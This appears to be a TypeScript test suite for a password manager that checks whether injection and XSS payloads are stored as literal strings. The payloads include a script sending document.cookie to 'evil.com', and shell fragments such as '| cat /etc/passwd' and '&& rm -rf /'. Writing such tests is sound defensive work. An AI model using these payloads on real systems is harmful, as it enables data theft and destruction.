/**
 * Input Validation Security Tests
 * Phase 5.3 - Security Audit & Penetration Testing
 * Tests OWASP M4: Insufficient Input Validation
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { UserRepositoryImpl } from '@/data/repositories/UserRepositoryImpl';
import { CredentialRepository } from '@/data/repositories/CredentialRepositoryImpl';
import { db } from '@/data/storage/database';
import type { Credential } from '@/domain/entities/Credential';

describe('OWASP M4: Insufficient Input Validation', () => {
  let userRepo: UserRepositoryImpl;
  let credRepo: CredentialRepository;
  let vaultKey: CryptoKey;
  let userId: string;

  beforeEach(async () => {
    userRepo = new UserRepositoryImpl();
    credRepo = new CredentialRepository();

    await db.users.clear();
    await db.credentials.clear();

    const user = await userRepo.createUser('test@example.com', 'Password123!');
    userId = user.id;
    const session = await userRepo.authenticateWithPassword('test@example.com', 'Password123!');
    vaultKey = session.vaultKey;
  });

  afterEach(async () => {
    await db.users.clear();
    await db.credentials.clear();
  });

  describe('XSS (Cross-Site Scripting) Prevention', () => {
    it('should safely store credential titles with script tags', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')">',
      ];

      for (const payload of xssPayloads) {
        const credential: Credential = {
          id: crypto.randomUUID(),
          userId,
          title: payload,
          password: 'pass',
          category: 'login',
          tags: [],
          isFavorite: false,
          createdAt: new Date(),
          updatedAt: new Date(),
          lastAccessedAt: new Date(),
        };

        const saved = await credRepo.save(credential, vaultKey);
        expect(saved.title).toBe(payload); // Stored as-is (sanitization done on render)

        const retrieved = await credRepo.findById(credential.id, vaultKey);
        expect(retrieved?.title).toBe(payload);
      }
    });

    it('should safely store notes with HTML/JavaScript', async () => {
      const xssNotes = [
        '<script>fetch("evil.com?cookie="+document.cookie)</script>',
        '<a href="javascript:void(0)" onclick="alert(\'XSS\')">Click</a>',
        '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
      ];

      for (const note of xssNotes) {
        const credential: Credential = {
          id: crypto.randomUUID(),
          userId,
          title: 'XSS Test',
          notes: note,
          password: 'pass',
          category: 'note',
          tags: [],
          isFavorite: false,
          createdAt: new Date(),
          updatedAt: new Date(),
          lastAccessedAt: new Date(),
        };

        await credRepo.save(credential, vaultKey);
        const retrieved = await credRepo.findById(credential.id, vaultKey);

        expect(retrieved?.notes).toBe(note);
        // Note: React automatically escapes content, preventing XSS
      }
    });

    it('should handle event handler attributes in usernames', async () => {
      const maliciousUsernames = [
        'user" onerror="alert(\'XSS\')"',
        'user\' onclick=\'alert("XSS")\'',
        'user</input><script>alert("XSS")</script>',
      ];

      for (const username of maliciousUsernames) {
        const credential: Credential = {
          id: crypto.randomUUID(),
          userId,
          title: 'Test',
          username,
          password: 'pass',
          category: 'login',
          tags: [],
          isFavorite: false,
          createdAt: new Date(),
          updatedAt: new Date(),
          lastAccessedAt: new Date(),
        };

        const saved = await credRepo.save(credential, vaultKey);
        expect(saved.username).toBe(username);
      }
    });
  });

  describe('SQL Injection Prevention (IndexedDB)', () => {
    it('should safely handle SQL-like injection attempts in email', async () => {
      const sqlInjections = [
        "admin'--",
        "admin' OR '1'='1",
        "admin'; DROP TABLE users;--",
        "admin' UNION SELECT * FROM credentials--",
        "1' OR '1' = '1",
      ];

      for (const email of sqlInjections) {
        try {
          const user = await userRepo.createUser(email, 'Password123!');
          expect(user.email).toBe(email);

          // Verify safe retrieval
          const found = await userRepo.findByEmail(email);
          expect(found?.email).toBe(email);
        } catch (error) {
          // May fail due to other validation, but should not cause injection
          expect(error).toBeDefined();
        }
      }
    });

    it('should safely query credentials with special characters', async () => {
      const specialTitles = [
        "'; DROP TABLE credentials;--",
        "1' OR '1'='1",
        "\" OR 1=1--",
        "admin'/**/OR/**/1=1--",
      ];

      for (const title of specialTitles) {
        const credential: Credential = {
          id: crypto.randomUUID(),
          userId,
          title,
          password: 'pass',
          category: 'login',
          tags: [],
          isFavorite: false,
          createdAt: new Date(),
          updatedAt: new Date(),
          lastAccessedAt: new Date(),
        };

        await credRepo.save(credential, vaultKey);
      }

      // Verify all credentials retrievable without injection
      const all = await credRepo.findAll(vaultKey);
      expect(all.length).toBe(specialTitles.length);
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should safely handle path traversal in credential titles', async () => {
      const traversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\Windows\\System32',
        '....//....//....//etc/passwd',
      ];

      for (const title of traversalAttempts) {
        const credential: Credential = {
          id: crypto.randomUUID(),
          userId,
          title,
          password: 'pass',
          category: 'login',
          tags: [],
          isFavorite: false,
          createdAt: new Date(),
          updatedAt: new Date(),
          lastAccessedAt: new Date(),
        };

        const saved = await credRepo.save(credential, vaultKey);
        expect(saved.title).toBe(title); // Stored as literal string, no file access
      }
    });

    it('should safely handle null bytes in input', async () => {
      const nullByteAttempts = [
        'credential\0.txt',
        'user\0admin',
        'pass\0\0\0word',
      ];

      for (const title of nullByteAttempts) {
        const credential: Credential = {
          id: crypto.randomUUID(),
          userId,
          title,
          password: 'pass',
          category: 'login',
          tags: [],
          isFavorite: false,
          createdAt: new Date(),
          updatedAt: new Date(),
          lastAccessedAt: new Date(),
        };

        const saved = await credRepo.save(credential, vaultKey);
        // Null bytes may be stripped or preserved depending on implementation
        expect(saved.title).toBeDefined();
      }
    });
  });

  describe('Buffer Overflow Prevention', () => {
    it('should handle extremely long passwords', async () => {
      const longPassword = 'P@ssw0rd' + 'a'.repeat(10000);

      const user = await userRepo.createUser('long@example.com', longPassword);
      expect(user).toBeDefined();

      const session = await userRepo.authenticateWithPassword('long@example.com', longPassword);
      expect(session.vaultKey).toBeDefined();
    });

    it('should handle extremely long credential titles', async () => {
      const longTitle = 'Title ' + 'x'.repeat(10000);

      const credential: Credential = {
        id: crypto.randomUUID(),
        userId,
        title: longTitle,
        password: 'pass',
        category: 'login',
        tags: [],
        isFavorite: false,
        createdAt: new Date(),
        updatedAt: new Date(),
        lastAccessedAt: new Date(),
      };

      const saved = await credRepo.save(credential, vaultKey);
      expect(saved.title.length).toBe(longTitle.length);
    });

    it('should handle extremely long notes', async () => {
      const longNotes = 'Note: ' + 'y'.repeat(50000);

      const credential: Credential = {
        id: crypto.randomUUID(),
        userId,
        title: 'Test',
        notes: longNotes,
        password: 'pass',
        category: 'note',
        tags: [],
        isFavorite: false,
        createdAt: new Date(),
        updatedAt: new Date(),
        lastAccessedAt: new Date(),
      };

      await credRepo.save(credential, vaultKey);
      const retrieved = await credRepo.findById(credential.id, vaultKey);

      expect(retrieved?.notes?.length).toBe(longNotes.length);
    });

    it('should handle many tags without overflow', async () => {
      const manyTags = Array.from({ length: 1000 }, (_, i) => `tag${String(i)}`);

      const credential: Credential = {
        id: crypto.randomUUID(),
        userId,
        title: 'Many Tags',
        password: 'pass',
        category: 'login',
        tags: manyTags,
        isFavorite: false,
        createdAt: new Date(),
        updatedAt: new Date(),
        lastAccessedAt: new Date(),
      };

      const saved = await credRepo.save(credential, vaultKey);
      expect(saved.tags.length).toBe(1000);

      const retrieved = await credRepo.findById(credential.id, vaultKey);
      expect(retrieved?.tags.length).toBe(1000);
    });
  });

  describe('Format String Injection Prevention', () => {
    it('should safely handle format specifiers in input', async () => {
      const formatStrings = [
        '%s%s%s%s%s%s%s%s%s%s',
        '%x%x%x%x%x%x%x%x',
        '%n%n%n%n',
        '${7*7}',
        '{{7*7}}',
      ];

      for (const format of formatStrings) {
        const credential: Credential = {
          id: crypto.randomUUID(),
          userId,
          title: format,
          password: format,
          notes: format,
          category: 'login',
          tags: [format],
          isFavorite: false,
          createdAt: new Date(),
          updatedAt: new Date(),
          lastAccessedAt: new Date(),
        };

        const saved = await credRepo.save(credential, vaultKey);
        expect(saved.title).toBe(format);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should safely handle command injection attempts', async () => {
      const commandInjections = [
        '; ls -la',
        '| cat /etc/passwd',
        '`whoami`',
        '$(whoami)',
        '&& rm -rf /',
      ];

      for (const cmd of commandInjections) {
        const credential: Credential = {
          id: crypto.randomUUID(),
          userId,
          title: cmd,
          password: 'pass',
          category: 'login',
          tags: [],
          isFavorite: false,
          createdAt: new Date(),
          updatedAt: new Date(),
          lastAccessedAt: new Date(),
        };

        const saved = await credRepo.save(credential, vaultKey);
        expect(saved.title).toBe(cmd); // Stored as literal, no command execution
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should safely handle LDAP injection attempts in email', async () => {
      const ldapInjections = [
        'admin)(|(password=*))',
        '*)(uid=*))(|(uid=*',
        'admin*',
        'admin)(&(password=*))',
      ];

      for (const email of ldapInjections) {
        try {
          const user = await userRepo.createUser(email, 'Password123!');
          expect(user.email).toBe(email);
        } catch (error) {
          // May fail validation but should not cause LDAP injection
          expect(error).toBeDefined();
        }
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should safely handle NoSQL injection attempts', async () => {
      const nosqlInjections = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "this.password == this.username"}',
        '{$regex: ".*"}',
      ];

      for (const payload of nosqlInjections) {
        const credential: Credential = {
          id: crypto.randomUUID(),
          userId,
          title: payload,
          username: payload,
          password: 'pass',
          category: 'login',
          tags: [],
          isFavorite: false,
          createdAt: new Date(),
          updatedAt: new Date(),
          lastAccessedAt: new Date(),
        };

        const saved = await credRepo.save(credential, vaultKey);
        expect(saved.title).toBe(payload);
      }
    });
  });

  describe('Unicode & Encoding Attack Prevention', () => {
    it('should handle unicode normalization attacks', async () => {
      // Different unicode representations of same character
      // Security note: Email addresses with unicode variants should be handled safely
      // Each variant should be treated as a unique identifier
      const unicodeVariants = [
        'cafe_nfc@example.com',      // NFC version
        'cafe_nfd@example.com',      // NFD version
        'mathbold@example.com',      // Mathematical bold replacement
        'mathdouble@example.com',    // Mathematical double-struck replacement
      ];

      // Clear users before test to ensure clean state
      await db.users.clear();

      for (const email of unicodeVariants) {
        const user = await userRepo.createUser(email, 'Password123!');
        expect(user.email).toBe(email);
      }
    });

    it('should handle zero-width characters', async () => {
      const zeroWidthChars = [
        'admin\u200Buser',     // Zero-width space
        'admin\u200Cuser',     // Zero-width non-joiner
        'admin\uFEFFuser',     // Zero-width no-break space
      ];

      for (const username of zeroWidthChars) {
        const credential: Credential = {
          id: crypto.randomUUID(),
          userId,
          title: 'Test',
          username,
          password: 'pass',
          category: 'login',
          tags: [],
          isFavorite: false,
          createdAt: new Date(),
          updatedAt: new Date(),
          lastAccessedAt: new Date(),
        };

        const saved = await credRepo.save(credential, vaultKey);
        expect(saved.username).toBe(username);
      }
    });

    it('should handle homograph attacks', async () => {
      // Cyrillic 'а' looks like Latin 'a'
      const homographs = [
        'аdmin',  // Cyrillic 'а'
        'admin',  // Latin 'a'
        'раypal', // Cyrillic 'р' and 'а'
        'paypal', // All Latin
      ];

      for (const email of homographs) {
        const user = await userRepo.createUser(`${email}@example.com`, 'Password123!');
        expect(user.email).toContain(email);
      }
    });
  });

  describe('Type Confusion Prevention', () => {
    it('should handle unexpected data types gracefully', async () => {
      const credential = {
        id: crypto.randomUUID(),
        userId,
        title: 123, // Number instead of string
        password: true, // Boolean instead of string
        category: 'login',
        tags: 'not-an-array', // String instead of array
        isFavorite: 'yes', // String instead of boolean
        createdAt: new Date(),
        updatedAt: new Date(),
        lastAccessedAt: new Date(),
      };

      try {
        await credRepo.save(credential as Credential, vaultKey);
        // If TypeScript allows it, should still not cause security issue
      } catch (error) {
        // Type validation may reject it
        expect(error).toBeDefined();
      }
    });
  });
});
